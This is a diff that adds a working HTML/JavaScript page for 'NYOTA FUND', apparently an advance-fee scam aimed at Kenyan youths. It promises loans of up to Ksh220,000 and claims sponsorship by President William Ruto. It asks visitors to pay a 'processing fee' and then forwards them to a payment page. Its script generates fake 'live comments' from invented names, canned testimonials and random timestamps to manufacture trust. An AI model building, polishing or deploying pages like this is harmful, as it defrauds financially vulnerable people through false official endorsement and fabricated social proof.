@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+ <!-- Brevo Conversations {literal} -->
+<script>
+    (function(d, w, c) {
+        w.BrevoConversationsID = '6973a340153840fff105d60b';
+        w[c] = w[c] || function() {
+            (w[c].q = w[c].q || []).push(arguments);
+        };
+        var s = d.createElement('script');
+        s.async = true;
+        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
+        if (d.head) d.head.appendChild(s);
+    })(document, window, 'BrevoConversations');
+</script>
+<!-- /Brevo Conversations {/literal} -->
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NYOTA FUND – Amount Selection</title>
+
+  <!-- keep external stylesheet if present -->
+  <link rel="stylesheet" href="style.css">
+
+  <!-- Minimal local improvements so the file works without relying on external styles -->
+  <style>
+    :root{
+      --primary:#0b8a3e;
+      --muted:#6b7280;
+      --card:#fff;
+      --bg:#f7f7f9;
+      --danger:#e11d48;
+    }
+    body{
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: var(--bg);
+      margin:0;
+      padding:20px;
+      color:#111827;
+    }
+    .container{
+      max-width:820px;
+      margin:0 auto;
+      background:linear-gradient(180deg,#ffffff 0%, #fbfdff 100%);
+      border:1px solid #e6e9ee;
+      padding:20px;
+      border-radius:10px;
+      box-shadow:0 6px 18px rgba(15,23,42,0.06);
+    }
+    h3{margin-bottom:8px}
+    .fund-buttons{
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px;
+      margin-top:6px;
+    }
+    /* Reverted button coloring so external style.css (the original) controls colors.
+       We keep spacing, radius and interaction helpers but do NOT force background/color. */
+    .fund-buttons button{
+      background: transparent; /* let style.css provide the color */
+      border: none;             /* let style.css provide border if desired */
+      padding:10px 14px;
+      border-radius:8px;
+      cursor:pointer;
+      transition:all .18s ease;
+      font-weight:600;
+      min-width:110px;
+      text-align:center;
+    }
+    .fund-buttons button:hover{ transform:translateY(-3px); box-shadow:0 6px 12px rgba(2,6,23,0.06) }
+    .fund-buttons button:focus{ outline:3px solid rgba(11,138,62,0.14) }
+    /* Active state now only highlights with outline & shadow so the original colors stay intact */
+    .fund-buttons button.active{
+      box-shadow: 0 8px 18px rgba(11,138,62,0.16);
+      outline: 3px solid rgba(11,138,62,0.12);
+      transform:translateY(-2px);
+    }
+
+    .info {
+      margin-top:14px;
+      font-size:18px;
+      line-height:1.6;
+    }
+
+    /* Fee panel: hidden until selection — animate in */
+    .fee-panel{
+      margin-top:18px;
+      padding:14px;
+      border-radius:8px;
+      background:linear-gradient(180deg, #ffffff, #fbfff7);
+      border:1px solid #e6f6ea;
+      box-shadow:0 4px 14px rgba(11,138,62,0.06);
+      transition: all 480ms cubic-bezier(.2,.9,.2,1);
+      opacity:0;
+      transform:translateY(12px);
+      max-height:0;
+      overflow:hidden;
+    }
+    .fee-panel.visible{
+      opacity:1;
+      transform:translateY(0);
+      max-height:220px;
+    }
+
+    .fee-row{ display:flex; align-items:center; gap:10px; font-size:20px; }
+    .label{ color:var(--muted); min-width:160px }
+    .value{ font-weight:800; color:#0f1724; font-size:22px }
+    .counter{ display:inline-block; min-width:120px; }
+
+    button.continue{
+      margin-top:18px;
+      background:var(--primary);
+      color:#fff;
+      border:0;
+      padding:12px 16px;
+      font-weight:700;
+      border-radius:8px;
+      cursor:pointer;
+      transition:transform .12s;
+    }
+    button.continue:disabled{
+      background:#9ad7a8;
+      cursor:not-allowed;
+      opacity:.8;
+    }
+
+    .comments-box{
+      margin-top:12px;
+      height:220px;
+      overflow:auto;
+      border-radius:8px;
+      padding:10px;
+      background:#fff;
+      border:1px solid #e6e9ee;
+    }
+    .comment{ padding:6px 0; border-bottom:1px dashed #f1f1f4; font-size:14px }
+    .muted{ color:var(--muted); font-size:13px }
+    @media (max-width:540px){
+      .fund-buttons button{ min-width:48%; font-size:14px }
+      .label{ min-width:120px }
+    }
+  </style>
+
+  <!-- Firebase (kept as in original) -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+  <script src="firebase-config.js"></script>
+</head>
+<body>
+
+<div class="container">
+
+  <p style="font-size:20px; font-weight:bold;">
+    Congratulations 👏 <span id="username"></span>.
+  </p>
+
+  <p class="info">
+    You are eligible to receive NYOTA FUND. Here is your NYOTA FUNDs LIMIT.
+    ⬇️⬇️⬇️
+  </p>
+
+  <ul style="font-size:18px; line-height:1.8;">
+    <li>1. Ksh22,000 — processing fee is <strong>Ksh240</strong></li>
+    <li>2. Ksh32,300 — processing fee is <strong>Ksh290</strong></li>
+    <li>3. Ksh43,800 — processing fee is <strong>Ksh330</strong></li>
+    <li>4. Ksh50,000 — processing fee is <strong>Ksh410</strong></li>
+    <li>5. Ksh93,300 — processing fee is <strong>Ksh490</strong></li>
+    <li>6. Ksh102,000 — processing fee is <strong>Ksh545</strong></li>
+    <li>7. Ksh150,000 — processing fee is <strong>Ksh600</strong></li>
+    <li>8. Ksh200,000 — processing fee is <strong>Ksh685</strong></li>
+    <li>9. Ksh220,000 — processing fee is <strong>Ksh710</strong></li>
+  </ul>
+
+  <p style="margin-top:10px;" class="muted">
+    That's our 2025–2026 strategy of supporting our Youths.
+    You are required to choose the amount you can afford to pay its processing fee.
+  </p>
+
+  <p style="font-weight:bold; color: #b91c1c;">
+    REMEMBER YOU WILL RECEIVE YOUR NYOTA FUND IN LESS THAN 3 MINUTES AFTER PAYING ITS PROCESSING FEE.
+  </p>
+
+  <p class="muted">
+    NYOTA FUND KENYA sponsored by
+    <strong>WILLIAM SAMOEI RUTO</strong>, President of Kenya 🇰🇪
+  </p>
+
+  <hr>
+
+  <!-- Amount buttons -->
+  <div class="fund-buttons" role="list">
+    <button type="button" data-amount="22000" data-fee="240" aria-label="Select Ksh 22,000" role="listitem">Ksh 22,000</button>
+    <button type="button" data-amount="32300" data-fee="290" aria-label="Select Ksh 32,300" role="listitem">Ksh 32,300</button>
+    <button type="button" data-amount="43800" data-fee="330" aria-label="Select Ksh 43,800" role="listitem">Ksh 43,800</button>
+    <button type="button" data-amount="50000" data-fee="410" aria-label="Select Ksh 50,000" role="listitem">Ksh 50,000</button>
+    <button type="button" data-amount="93300" data-fee="490" aria-label="Select Ksh 93,300" role="listitem">Ksh 93,300</button>
+    <button type="button" data-amount="102000" data-fee="545" aria-label="Select Ksh 102,000" role="listitem">Ksh 102,000</button>
+    <button type="button" data-amount="150000" data-fee="600" aria-label="Select Ksh 150,000" role="listitem">Ksh 150,000</button>
+    <button type="button" data-amount="200000" data-fee="685" aria-label="Select Ksh 200,000" role="listitem">Ksh 200,000</button>
+    <button type="button" data-amount="220000" data-fee="710" aria-label="Select Ksh 220,000" role="listitem">Ksh 220,000</button>
+  </div>
+
+  <!-- Animated fee panel (initially hidden) -->
+  <div id="feePanel" class="fee-panel" aria-live="polite" aria-hidden="true">
+    <div class="fee-row">
+      <div class="label">Amount to Receive:</div>
+      <div class="value">Ksh <span id="selectedAmount" class="counter">---</span></div>
+    </div>
+    <div style="height:8px"></div>
+    <div class="fee-row">
+      <div class="label">Processing Fee:</div>
+      <div class="value">Ksh <span id="processingFee" class="counter">---</span></div>
+    </div>
+    <div style="height:10px"></div>
+    <div class="muted">Once you click continue, you will be taken to the payment page where you will pay the processing fee.</div>
+  </div>
+
+  <button id="continueBtn" class="continue" onclick="continueToPayment()" disabled>Continue to Payment</button>
+
+  <!-- Comments -->
+  <h3 style="margin-top:30px;">Live Comments now</h3>
+  <div id="commentsBox" class="comments-box" aria-live="off"></div>
+
+</div>
+
+<script>
+ /* ===== LOAD USER NAME FROM REGISTER (CAPITAL) ===== */
+(function () {
+  const phone = localStorage.getItem("userPhone");
+  const users = JSON.parse(localStorage.getItem("nyota_users") || "[]");
+
+  if (!phone || !users.length) {
+    // not fatal — just don't show a name
+    return;
+  }
+
+  const currentUser = users.find(u => u.phone === phone);
+
+  if (currentUser && currentUser.fullname) {
+    const nameEl = document.getElementById("username");
+    if (nameEl) {
+      nameEl.textContent = currentUser.fullname.toUpperCase();
+    }
+  }
+})();
+
+/* ================= STATE ================= */
+let selectedFund = null;
+// We'll still remember previous selection but we won't auto-show the fee panel until user clicks
+const savedFundRaw = localStorage.getItem("selectedFund");
+const savedFund = savedFundRaw ? JSON.parse(savedFundRaw) : null;
+
+const feePanel = document.getElementById("feePanel");
+const selectedAmountEl = document.getElementById("selectedAmount");
+const processingFeeEl = document.getElementById("processingFee");
+const continueBtn = document.getElementById("continueBtn");
+
+/* utility: format number with thousand separators */
+function formatNumber(n) {
+  if (n === null || n === undefined || isNaN(n)) return n;
+  return n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+}
+
+/* Animated counter: count from start to end in duration ms */
+function animateCount(el, start, end, duration = 700) {
+  start = Number(start) || 0;
+  end = Number(end) || 0;
+  const range = end - start;
+  const startTime = performance.now();
+  function step(now) {
+    const elapsed = now - startTime;
+    const t = Math.min(1, elapsed / duration);
+    // easeOutCubic
+    const eased = 1 - Math.pow(1 - t, 3);
+    const value = Math.round(start + range * eased);
+    el.textContent = formatNumber(value);
+    if (t < 1) {
+      requestAnimationFrame(step);
+    } else {
+      el.textContent = formatNumber(end);
+    }
+  }
+  requestAnimationFrame(step);
+}
+
+/* Show fee panel and animate values, also scroll into view */
+let feeVisible = false;
+function showFeePanel(amount, fee) {
+  // ensure values are numbers
+  const a = Number(amount) || 0;
+  const f = Number(fee) || 0;
+
+  feePanel.classList.add("visible");
+  feePanel.setAttribute("aria-hidden", "false");
+  continueBtn.disabled = false;
+
+  // smooth scroll into view, center of viewport if possible
+  setTimeout(() => {
+    feePanel.scrollIntoView({ behavior: "smooth", block: "center" });
+  }, 50);
+
+  // animate counters
+  animateCount(selectedAmountEl, 0, a, 800);
+  animateCount(processingFeeEl, 0, f, 800);
+
+  feeVisible = true;
+}
+
+/* ================= AMOUNT BUTTON LOGIC ================= */
+function clearActiveButtons() {
+  document.querySelectorAll(".fund-buttons button").forEach(b => b.classList.remove("active"));
+}
+
+/* wire up buttons */
+document.querySelectorAll(".fund-buttons button").forEach(btn => {
+  // if saved selection matches, mark active (but don't auto-show fee)
+  if (savedFund && String(savedFund.amount) === btn.dataset.amount) {
+    btn.classList.add("active");
+    selectedFund = { amount: savedFund.amount, fee: savedFund.fee };
+    // Do not call showFeePanel automatically — user must click the button to reveal the fee
+    continueBtn.disabled = true;
+  }
+
+  btn.addEventListener("click", (ev) => {
+    const amount = btn.dataset.amount;
+    const fee = btn.dataset.fee;
+
+    // set selection
+    selectedFund = { amount, fee };
+
+    // visual active
+    clearActiveButtons();
+    btn.classList.add("active");
+
+    // save selection
+    try {
+      localStorage.setItem("selectedFund", JSON.stringify(selectedFund));
+    } catch (e) {
+      console.warn("Could not save selectedFund:", e);
+    }
+
+    // show animated fee panel and scroll
+    showFeePanel(amount, fee);
+  });
+
+  // keyboard-friendly activation using Enter/Space
+  btn.addEventListener("keydown", (e) => {
+    if (e.key === "Enter" || e.key === " ") {
+      e.preventDefault();
+      btn.click();
+    }
+  });
+});
+
+/* Continue button behavior */
+function continueToPayment() {
+  if (!selectedFund) {
+    alert("Please select an amount first.");
+    return;
+  }
+
+  // Re-save selection and proceed
+  localStorage.setItem("selectedFund", JSON.stringify(selectedFund));
+  // navigate to payment page
+  window.location.href = "payment1.html";
+}
+
+/* ================= COMMENTS & TESTIMONIES ================= */
+const commentsBox = document.getElementById("commentsBox");
+
+const names = [
+  "Mary Wanjiku","James Otieno","Faith Njeri","Kevin Mwangi",
+  "Brian Kiptoo","Ann Chebet","John Kamau","Lucy Atieno",
+  "Peter Mutiso","Grace Akinyi","Samuel Kibet","Mercy Nyambura",
+  "Daniel Ouma","Esther Jepchirchir","Joseph Maina","Susan Wairimu",
+  "Victor Ochieng","Alice Muthoni","Dennis Barasa","Ruth Chelimo",
+  "Paul Onyango","Nancy Wambui","Eric Rotich","Linda Auma",
+  "George Kiplagat","Janet Moraa","Michael Njoroge","Brenda Akinyi",
+  "Stephen Bett","Caroline Mumbi","Allan Otieno","Diana Jepkosgei",
+  "Patrick Kimani","Beatrice Wanjala","Noah Kiplangat","Irene Atieno",
+  "Felix Kariuki","Joyce Nyambura","Caleb Mutua","Winfred Chepkemoi"
+];
+
+const messages = [
+  "Just received 50k from NYOTA FUND! Thank you 🙏",
+  "Thought it was a scam but got my 25k. So happy!",
+  "Received 40k. Real and trusted platform 🙌",
+  "Funds came in less than 3 minutes. Amazing!",
+  "I top up my business with NYOTA FUND. Thanks!",
+  "Very quick and reliable. Got 30k.",
+  "I started my small business using 50k. Thank you!",
+  "Payment was smooth, received 26,500.",
+  "NYOTA FUND is trustworthy. Got my 38k.",
+  "Amazing service, 46,850 received.",
+  "Quick approval and fast fund delivery.",
+  "Thought it was fake but got my money.",
+  "12,300 received successfully. Thank you NYOTA FUND!",
+  "Funds delivered faster than expected.",
+  "Real platform, got 50k in my phone.",
+  "My business top-up went through smoothly.",
+  "NYOTA FUND is the real deal. 79,700 received.",
+  "Funds helped pay my rent. Thank you!",
+  "Quick processing, I received 106,500.",
+  "Very satisfied with NYOTA FUND.",
+  "Received my 38,100 in minutes.",
+  "Started business and got 26,500.",
+  "Funds legit, fast, and reliable.",
+  "Happy to receive 46,850, thanks!",
+  "NYOTA FUND never disappoints.",
+  "50k received in record time.",
+  "Platform is trustworthy. Funds received.",
+  "I paid the processing fee and got my 12,300 instantly.",
+  "Real platform, very satisfied.",
+  "Received 79,700, helped me start my project."
+];
+
+function timeAgo() {
+  const times = [
+    "just now","2 seconds ago","10 seconds ago",
+    "30 seconds ago","1 minute ago","2 minutes ago","5 minutes ago"
+  ];
+  return times[Math.floor(Math.random() * times.length)];
+}
+
+// Shuffle
+function shuffle(arr) {
+  for (let i = arr.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [arr[i], arr[j]] = [arr[j], arr[i]];
+  }
+  return arr;
+}
+
+let comments = shuffle(names).map(name => ({
+  name,
+  text: messages[Math.floor(Math.random() * messages.length)],
+  time: timeAgo()
+}));
+
+comments.forEach(c => {
+  const div = document.createElement("div");
+  div.className = "comment";
+  div.innerHTML = `
+    <strong>${c.name}</strong>: ${c.text}
+    <br><span class="muted">commented ${c.time}</span>
+  `;
+  commentsBox.appendChild(div);
+});
+
+// Auto scroll: smoother (requestAnimationFrame + small step)
+let autoScrollPos = 0;
+let autoScrollInterval = 70;
+let scrollTimer = setInterval(() => {
+  autoScrollPos++;
+  commentsBox.scrollTop = autoScrollPos;
+  if (autoScrollPos >= commentsBox.scrollHeight - commentsBox.clientHeight) {
+    autoScrollPos = 0;
+  }
+}, autoScrollInterval);
+
+/* Accessibility: ensure that the fee panel is announced when revealed (aria-live already set)
+   and that the continue button becomes focusable once enabled */
+const observer = new MutationObserver(() => {
+  if (feePanel.classList.contains("visible")) {
+    continueBtn.focus({ preventScroll: true });
+  }
+});
+observer.observe(feePanel, { attributes: true, attributeFilter: ['class'] });
+
+</script>
+
+</body>
+</html>
